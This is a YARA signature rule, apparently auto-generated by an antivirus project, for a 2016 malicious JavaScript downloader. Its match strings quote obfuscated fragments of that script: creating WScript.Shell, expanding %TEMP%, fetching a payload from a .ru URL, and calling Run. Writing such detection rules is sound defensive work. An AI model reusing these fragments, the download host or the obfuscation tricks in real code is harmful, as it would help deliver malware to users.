rule sig_20160427_adb818c9944c0341d3973d6201b679c6 {
  meta:
    description = "datamaliciousorder - file 20160427_adb818c9944c0341d3973d6201b679c6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "72dc8ef91a9cd0cc63501519866e401928767072cd0e08ced35a65463484a6d7"

  strings:
    $s1  = "function OlzkoOedrz() {return XjiweAvsgh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QMS6zfA" ascii
    $s2  = "function OlzkoOedrz() {return XjiweAvsgh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QMS6zfA" ascii
    $s3  = "function WukioHjbav(PqwzuYsapt, PhegtQumrw){NzgkzDleph = NzgkzDleph * 1; return PqwzuYsapt - PhegtQumrw;};" fullword ascii
    $s4  = "var XjiweAvsgh = function EjebwTrdvl() {return NzdmuOpvnr[DthmhBekcd](\"WScript\"+\".Shell\");}(), TassfWutit = 11;" fullword ascii
    $s5  = "RzoktIrbwc[JsclsJpfyr](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var NzdmuOpvnr = this[\"WScript\"];" fullword ascii
    $s7  = "function GxuweNiget(){return DthmhBekcd;};" fullword ascii
    $s8  = "function QrfzjXhjgs(){return PjheqTdqjy + \"\";};" fullword ascii
    $s9  = "if (RzoktIrbwc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function WhfujPhbfa() {return ((PjhrlStoek == true) && (PjhrlStoek == BmkasDelzp)) ? 1 : NzgkzDleph;};" fullword ascii
    $s11 = "var CwvbhVerwa = false;" fullword ascii
    $s12 = "BmkasDelzp = true; " fullword ascii
    $s13 = "var MmwcvTkcle = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function ZxzxwOrruv(NyqxzZrgch) {var SbilaLghik = (1, 2, 3, 4, 5, NyqxzZrgch); return SbilaLghik;};" fullword ascii
    $s15 = "function NkqxmJygwn(){return 23;};" fullword ascii
    $s16 = "function MzearBbjzo(BwrhjUfwvf){XjiweAvsgh[\"R\"+\"un\"](BwrhjUfwvf, NzgkzDleph, NzgkzDleph);};" fullword ascii
    $s17 = "function GhszvYfumg()" fullword ascii
    $s18 = "var BmkasDelzp = false;" fullword ascii
    $s19 = "CwvbhVerwa = true;" fullword ascii
    $s20 = "var PjhrlStoek = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}